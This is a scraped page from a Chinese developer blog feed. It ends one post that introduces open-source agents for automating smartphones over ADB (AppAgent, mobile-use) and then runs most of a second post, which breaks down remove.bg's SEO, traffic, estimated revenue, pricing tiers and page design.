<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c21ac6223bf74939abbda4cc862eba33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=HG4VPmiFDMh2c4qEY4XCNcVpwAw%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/droidrun/droidrun</span>
</code></pre>
<h2 data-id="heading-3">04、AppAgent：腾讯开源</h2>
<p>这个开源项目的全称是 "Multimodal Agents as Smartphone Users"，像智能手机用户一样的多模态智能体。</p>
<p>它的设计初衷是赋予 AI  Agent 像人类用户一样的感知和操作能力。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df0e5718931b4ecc8a5215f63dd81320~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=%2FQWxhp3%2FpRSTPBNsNPKC3bogLRU%3D" alt="图片" loading="lazy"/></p>
<p>它通过 ADB（Android Debug Bridge）获取手机屏幕截图，发送给多模态大模型。</p>
<p>模型分析截图中的 UI 元素，决定下一步是点击哪个坐标还是滑动屏幕，从而实现真正的视觉交互。</p>
<p>和其它开源项目不同，AppAgent 模仿了人类学习新软件的过程：</p>
<p>当你给它一个新的 App 时，它可以通过自主探索或者观察人类演示来学习。</p>
<p>在这个过程中，它会记录下每个按钮是干什么的，并生成一份使用文档（Knowledge Base）。</p>
<p>当需要执行具体任务，它会调用之前生成的文档，精准地执行操作，而不需要每次都重新摸索。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/TencentQQGYLab/AppAgent</span>
</code></pre>
<h2 data-id="heading-4">05、mobile-use：说句话自动化你的手机</h2>
<p>这个开源项目现在有 1.8k 的 Star。支持安卓和 iOS 系统。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47268cab0c4f4c5987db78a37eedd928~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=OEFgGp%2BYgsVPvs6Qg34QAlOJfcg%3D" alt="图片" loading="lazy"/></p>
<p><strong>Mobile-Use</strong> 是一个由 Minitap AI 团队开源的 Python 库。它的核心逻辑是让 AI 模型模拟人类的操作行为。</p>
<p>它会截取当前手机屏幕的图像，将截图和用户的指令发送给多模态大模型。模型会分析截图，判断如果要完成这个任务，我现在该点哪里。</p>
<p>模型返回具体的坐标或操作指令（点击、滑动、输入），Mobile-Use 将其转换为底层的 ADB 命令执行。</p>
<p>执行完动作后，再次截图，确认是否进入了下一页，直到任务完成。</p>
<pre><code class="hljs language-perl" lang="perl">开源地址：https:<span class="hljs-regexp">//gi</span>thub.com/minitap-ai/mobile-<span class="hljs-keyword">use</span>
</code></pre>
<p>而且在技术实现上，mobile-use 集成了 Maestro 移动测试框架作为底层交互引擎，确保了对真实设备操作的稳定性和可靠性。同时，项目支持多种大模型后端，用户可以根据需要选择 OpenAI API、本地部署模型或其他兼容服务。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[小需求做到千万美元 ARR：remove.bg 全案拆解]]></title>    <link>https://juejin.cn/post/7576918517238349874</link>    <guid>https://juejin.cn/post/7576918517238349874</guid>    <pubDate>2025-11-27T05:17:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576918517238349874" data-draft-id="7576929700842160137" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="小需求做到千万美元 ARR：remove.bg 全案拆解"/> <meta itemprop="keywords" content="产品,AI编程"/> <meta itemprop="datePublished" content="2025-11-27T05:17:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="孟健AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/4212984287073895"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            小需求做到千万美元 ARR：remove.bg 全案拆解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984287073895/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    孟健AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T05:17:48.000Z" title="Thu Nov 27 2025 05:17:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是孟健。</p>
<p>今天开始，我将带领大家一起分析商业、分析产品。</p>
<p>这是商业洞察系列的第一篇。</p>
<p>为什么要开启这个系列呢？</p>
<p>在出海复盘中我写道，我们团队的优势在效率，劣势在市场。</p>
<p>我认为初创企业，需要关注的重点就是市场+效率，这两个做好了，就成功了一半。</p>
<p>因此，从现在开始，我自己会投入 50%的精力在市场研究、商业洞察这里，希望带头弥补这块的短板。</p>
<p>今天跟大家分享的这款产品是 remove.bg，这也是 AI 榜单前 10 的产品。</p>
<p>这个产品我觉得很值得研究学习，因为它其实是一个很垂直的需求市场，但是以小博大，它赚的钱不少。</p>
<h2 data-id="heading-0">01 价值主张写进 TDH</h2>
<p>先分析一下这个站点整体的 SEO 和流量情况。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fce8dabb78bd4442a32d253e5290bcf7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=QTMD3gYnmnYTIAB3ZWzSXpN7sXo%3D" alt="" loading="lazy"/></p>
<p>我觉得这个站点首先值得学习的是它的 TDH，让我们仔细观摩一下：</p>
<p>title: Remove Background from Image for Free – remove.bg</p>
<p>Description: Remove image backgrounds automatically in 5 seconds with just one click. Don't spend hours manually picking pixels. Upload your photo now &amp; see the magic.</p>
<p>H1: Remove Image Background</p>
<p>这个 TDH 好在哪呢？我觉得重要的是包含了价值主张。</p>
<p>价值主张是精益画布很重要的一环，做产品前，应该先想好价值主张是什么。</p>
<p>它的标题，首先描述的主功能 Remove Background，然后抛出了一个 Free 的钩子，增加 serp 吸引力。</p>
<p>这也是我们惯用的技巧了，我在优化 serp 展现的时候也经常会用这个手段。</p>
<p>Description 则详细地包含了它的价值主张：5 second with just one click。</p>
<p>很多人不重视这个，导致你的 serp 没有吸引力，用户看到都不会点击进去。</p>
<p>这个 TDH 就非常有吸引力，抓住了用户的痛点，这个团队一定是深入调研过用户需求的。</p>
<p>实际上我们仅仅通过这个 TDH 就已经可以分析出用户需求了：</p>
<p><strong>想要找一个免费的去除背景图的工具，快速处理图片。</strong></p>
<h2 data-id="heading-1">02 OpenGraph 让传播自带转化力</h2>
<p>除了 TDH 之外，我觉得这个站点在 SEO 还有一点值得我们学习的就是 OpenGraph：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0171539408f642ec9c68f72ed13ec4e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=0lrqMlED6MjCIisHTMgJ0sjSoWw%3D" alt="" loading="lazy"/></p>
<p>OpenGraph 我们会经常忽略，但在 Twitter 这样的媒体平台传播是一个非常关键的因素。</p>
<p>remove.bg 这张图是精心设计过的，有 before 和 after 对比，在社媒平台上你看到这张图，一眼就能明白这个产品的价值。</p>
<h2 data-id="heading-2">03 流量盘子：80M/月的搜索 + 直访</h2>
<p>聊完 SEO，我们看看站点的流量情况。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af831f8d7bb34b7bb735bc4316bb6640~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=rYezQVFZKTHP%2BQ16x7NZFQqzKew%3D" alt="" loading="lazy"/></p>
<p>这个站点近 3 个月，每个月大概有将近八千万的访问，是一个流量极高的站点，流量来源基本上是搜索+直接访问。</p>
<p>为什么这个站点直接访问这么高呢？我觉得首先是这个域名注册得非常好。</p>
<p>这是一个用户需求关键词的域名，非常容易记忆，用户在使用过后，可能就直接记住域名，下次就直接过来了。</p>
<p>然后再看它的搜索关键词，remove bg 这个关键词，月搜索量总数在 400 万，而它把这个流量全吃了。</p>
<p>也就是说，它在这个关键词上处于绝对的领先地位，一点流量都没有去竞争对手那里。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bdc94931e5544eea39b04696ee7b0a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=r%2Bs7pjDC3DLNxB2X72J%2FWLz7Cmo%3D" alt="" loading="lazy"/></p>
<p>从 SimilarWeb 上可以看到，它的品牌词占比 96%，而它的品牌词就是需求词，基本上在这个词上就是垄断了。</p>
<p>对于 background remover、remove background，也有基本上六七十的市场占有率。</p>
<p>它的流量大头国家可以看到是印度、巴西、美国等地区。</p>
<p>一般来说我们认为来自印巴地区的流量比较廉价，但是他这个量级非常大，即使 cpm 很低也能赚很多钱了。</p>
<p>不过我在这个站点上暂时没有发现广告的痕迹，在 SImilarWeb 上其实是有的：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76ec47f3c220457c9fd99ee4c11ffc6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=d68oX3TuTgoGHnSydIBTvXbygPA%3D" alt="" loading="lazy"/></p>
<p>出站流量第一名是 google，大概率是 adsense 广告了，不知道为什么他们现在去掉了广告。</p>
<h2 data-id="heading-3">04 赚多少钱？保守估算也很香</h2>
<p>就算按照最低的 cpm 估计，这个站纯广告收入也可以月入十万刀了，年入百万美金。</p>
<p>由于这个站点把 checkout 页面设置为不索引，所以没法估计它的订单量，但就算按照千分之一的转化率，它的定价策略按$10 来算，也有每个月 80 万刀的收益。</p>
<p>那么加起来，remove.bg 的 ARR 应该至少是千万美元级别的。就这么个小需求，做到了千万 ARR，这就是海外的生态。</p>
<p>这个域名的 whois 挂了，查不到是什么时候注册的域名，不过可以通过 archive 推断：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93392d33e11248c68b8e546c4e26c9a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=W1qKNPC54H%2F9IW03mfK7QB44tMc%3D" alt="" loading="lazy"/></p>
<p>其实 18 年的时候，这个站点就在布局了，他们的第一个版本就是 remove bg，那个时候 AI 还没有火热：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c35a3402fba4baaac659eef9487a06e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=IGSDhfxGlGoHBLIO5F%2FmEKRI1OY%3D" alt="" loading="lazy"/></p>
<p>我们看一下它的 about 页，果不其然，是 2018 年创立的团队：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/659845676f364a0c9d8751a03042c4a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=Yey2Y8sHEyzjWj6SbxhU7Ahog1o%3D" alt="" loading="lazy"/></p>
<p>他们竟然是 Canva 的一个子团队，从照片上来看大概有 50 多人了，从初创的角度来说人也不算少了。</p>
<h2 data-id="heading-4">05 上手体验：首屏直接把工具塞给你</h2>
<p>分析完流量和收益，我们来分析分析产品，看看这个产品有哪些是值得我们学习的。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/468905437afb44899b0498014cb0c1ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=sr8riACejFySq7PSNidlQ6eGoDQ%3D" alt="" loading="lazy"/></p>
<p>先看它的首屏，直接把工具放在首屏，也就是说，用户不用滚动，就可以直接体验工具，这也是我们提倡的。</p>
<p>对于工具类站点来说，首页不用什么 Banner 和 CTA，把工具放在首屏，让用户第一时间体验是最优的做法。</p>
<p>从审美的角度，我觉得这个首屏并不算非常美观，胜在简洁。</p>
<p>其实这也说明了，工具站不一定要有很惊艳的视觉效果，重在功能满足用户需求，这是首要的。</p>
<p>在未登录的时候就支持用户上传图片，并没有阻断用户体验，在上传图片之后，跳转到了一个编辑页：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be90bf977c17462e931c5b81b68e62f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=BQiVKHfa3iWtry%2BMo76aKlcck7o%3D" alt="" loading="lazy"/></p>
<p>这也是工具站点非常值得学习的方式，相当于首页是一个钩子，具体复杂的功能在内页实现。</p>
<p>这里的编辑器做的还是不错的，提供了基本的图片编辑功能，还能一键换背景。</p>
<p>如果你仔细体验，它还有各种涂刷之类的功能，可以说是非常专业的，并不是随随便便做的。</p>
<p>到这里为止，其实背景已经去除了，目前还不需要登录以及付费。</p>
<p>这也是跟它标榜的免费使用所符合。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af71e7620dd9450c8e0ce29ba45078be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=iiMaCmULkrQAcxITZVV7NcFePUU%3D" alt="" loading="lazy"/></p>
<p>在下载的时候，也给了一个免费选项，而且下载是完全没有水印的，相当于免费就可以完成整个闭环。</p>
<p>我试了一下，再上传一张图片，这条路径还可以继续走，没有限制。</p>
<p>不过这也只能是大厂玩法了，对于我们个人来说，如果这么干，成本肯定扛不住。</p>
<h2 data-id="heading-5">06 付费触发 &amp; 定价设计</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97f3834bac654d6aa06191cf6e3c6177~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=YM5KmMT9B%2Bw092JuY1cv38AkDH4%3D" alt="" loading="lazy"/></p>
<p>如果点击需要付费的功能，会引导进入 Pricing 页面，这个 Pricing 页面也是非常值得学习的设计。</p>
<p>首先，是月付和年付的设计，默认引导年付，但是年付显示的是按月的价格，也就是帮用户计算出如果年付会每个月省 50%的钱，从而拉高用户的 LTV，这也是一个常用的手段。</p>
<p>然后就是它的价格梯度设计，也是非常值得学习的。第一个梯度是，登录送一个积分。</p>
<p>也就是说，只要你注册了，就能拿到 1 个积分。我们做产品的时候，注册率也是重要的一个指标，可以采用这个方式提升用户的注册率。</p>
<p>然后就是按量付费的设计，阶梯定价：</p>
<ul>
<li>
<p>3 积分 $3</p>
</li>
<li>
<p>10 积分 $9</p>
</li>
<li>
<p>75 积分 $49</p>
</li>
<li>
<p>200 积分 $99</p>
</li>
<li>
<p>500 积分 $199</p>
</li>
<li>
<p>1200 积分 $399</p>
</li>
<li>
<p>4000 积分 $999</p>
</li>
<li>
<p>8000 积分 $1699</p>
</li>
</ul>
<p>这个阶梯设计我们可以参考学习，顺便说一下，工具站一定不要只有订阅，要支持按量计费的，能够有效提高付费转化率。</p>
<p>然后就是订阅阶梯：</p>
<p>Lite 版本，$54/年，支持基本的编辑和 API 操作。40 积分/月。</p>
<p>Pro 版本，$234/年，比 Lite 版本多了一个批量的功能，200 积分/月。</p>
<p>Volume+版本，$534/年，可以认为这是企业版本，支持定制各种图片规格等等，500 积分/月。</p>
<p>一般我们的产品，支持 2-3 个阶梯就可以了，如果没能力支持企业版，我认为做两个版本就够用。</p>
<p>一定要想好用户权益，什么权益是高净值用户需要的，定价如何，从用户需求的角度和成本综合考虑。</p>
<h2 data-id="heading-6">07 FAQ 把规则讲透</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/355b0870f44343e8b2530e0ad0f3a733~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=gmKYl4%2Fhm%2BlTJEF1rXHZGGOXiYc%3D" alt="" loading="lazy"/></p>
<p>然后我们来学习一下它的 Faq，工具站点的 Faq 非常重要，尤其是付费页面，你要说清楚很多用户关心的问题。</p>
<p>比如，一个积分是什么概念，在 remove.bg 的定义里，1 个积分可以处理一张图片，这就定义清楚了积分的价值。</p>
<p>另外，它还附加说明了，订阅送的积分，只在订阅期间有效，而一次购买的积分，永久有效。</p>
<p>这些都是我们需要说明的规则。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee9de9d991de4f18bca410a5c4be5659~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=uYt8iuYyfFRLqGjPBktr2woip%2FQ%3D" alt="" loading="lazy"/></p>
<p>它还解释了什么场景适合单买积分，什么场景适合订阅，降低用户心智，实际上这针对的是不同的用户群体。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2812cd360284399ac87cfb822db5669~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=TSu0PuW1UGZpY91kMxrzof2TSYk%3D" alt="" loading="lazy"/></p>
<p>然后，一定要声明你的产品是支持取消订阅的，这也是最基础的合规要求。否则用户可以去仲裁，会导致你大量的损失。以及取消订阅之后，积分怎么处理，一定要说明白。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a387b894959749c290e549dc0f47ec0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=0x073nAPA0m2UFRxqOkXVuw3tVc%3D" alt="" loading="lazy"/></p>
<p>最后就是隐私问题，海外用户还是比较注重隐私的，很多审核合规渠道都要求你的产品符合 GDPR（通用数据保护条例），你要做面向欧盟的产品，是必须要注意这一点的。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11c595b59f33483181deba2d94ea1b3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=28lOOdJLW3Yd%2BXLbH9V%2BwN3suJI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">08 信息架构：导航做减法</h2>
<p>然后我们看它的导航栏设计，也是值得学习的，它的内页其实很多，但并不是每一个内页都要硬塞到导航栏里，它的导航非常简单：</p>
<ul>
<li>
<p>upload 是主功能</p>
</li>
<li>
<p>bulk 是附加功能，也是刚刚我们看到 pro 用户的最大的价值</p>
</li>
<li>
<p>api 是开放文档</p>
</li>
<li>
<p>plugins 是支持的插件</p>
</li>
<li>
<p>Pricing 是定价页</p>
</li>
</ul>
<p>我觉得做产品，一定要学会做减法，导航太臃肿，给用户的心智负担就很重，你不是 tob 的产品，而是这种 toc 的垂类产品，那就必须要学会做减法。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/827fb51803a740ca953b35aea6b155eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=9eNpdcKRXOEDa%2FaqXFtZa5Y5qbE%3D" alt="" loading="lazy"/></p>
<p>这个 bulk 页面，我觉得非常值得学习的点就是，它通过首屏的动图，让你立即能理解这个功能带来的附加价值，我觉得这个页面的 CTR 会非常不错，非常清晰易懂。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/932d2aa2ec9144cdaf5322ca1c9191c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=BiiEz3%2FRu%2BSjInShixoRCUWlQXk%3D" alt="" loading="lazy"/></p>
<p>plugin 页面就是在展示大厂实力了，这也是护城河。尽管是一个去除背景的小需求，它能做各种插件、APP，与这么多效率工具打通，如果我们以个人力量去和他竞争，那无异于以卵击石。</p>
<h2 data-id="heading-8">09 场景、功能、案例三套内页矩阵</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66c5eff2b1af43acbaebd2927537a223~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=maPLEOtSPfZdJhaQXCJcjQSyQWA%3D" alt="" loading="lazy"/></p>
<p>这是它做的一个 features 集合页，也就是说，产品的所有特性，它都做成了内页，而且每个内页都基本有个动图，这无论是从 SEO 的角度还是用户体验的角度来说都特别好，我觉得很值得我们学习。</p>
